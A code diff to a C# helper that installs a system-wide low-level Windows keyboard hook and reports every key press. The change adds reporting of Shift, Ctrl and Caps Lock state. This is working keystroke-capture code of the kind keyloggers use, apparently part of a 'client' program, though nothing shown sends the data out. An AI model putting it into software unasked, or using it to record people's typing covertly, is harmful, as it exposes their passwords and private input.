@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace CLIENT.Helpers
 {
@@ -8,11 +9,14 @@ namespace CLIENT.Helpers
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int VK_CAPITAL = 0x14;  // Virtual Key Code for Caps Lock
+        private const int VK_SHIFT = 0x10;    // Virtual Key Code for Shift
+        private const int VK_CONTROL = 0x11;  // Virtual Key Code for Ctrl
 
         private static IntPtr _hookID = IntPtr.Zero;
         private static LowLevelKeyboardProc _proc;
 
-        public delegate void KeyPressedHandler(string key);
+        public delegate void KeyPressedHandler(string key, bool isShiftPressed, bool isCtrlPressed, bool isCapsLockOn);
         public static event KeyPressedHandler OnKeyPressed;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -31,7 +35,7 @@ namespace CLIENT.Helpers
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("user32.dll")]
-        private static extern int GetKeyNameText(int lParam, [Out] System.Text.StringBuilder lpString, int nSize);
+        private static extern int GetKeyState(int nVirtKey);
 
         public static void Start()
         {
@@ -59,11 +63,31 @@ namespace CLIENT.Helpers
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                ConsoleKey key = (ConsoleKey)vkCode;
 
-                // Convert VK code to string
-                string key = ((ConsoleKey)vkCode).ToString();
+                // Check if Caps Lock is on
+                bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-                OnKeyPressed?.Invoke(key);
+                // Check if Shift key is pressed
+                bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+
+                // Check if Ctrl key is pressed
+                bool isCtrlPressed = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+
+                // Prepare the key string for Shift or Ctrl combinations
+                string keyString = key.ToString();
+
+                if (isShiftPressed)
+                {
+                    keyString = "Shift + " + keyString;
+                }
+                else if (isCtrlPressed)
+                {
+                    keyString = "Ctrl + " + keyString;
+                }
+
+                // Fire event with the key, shift, ctrl, and caps lock states
+                OnKeyPressed?.Invoke(keyString, isShiftPressed, isCtrlPressed, isCapsLockOn);
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
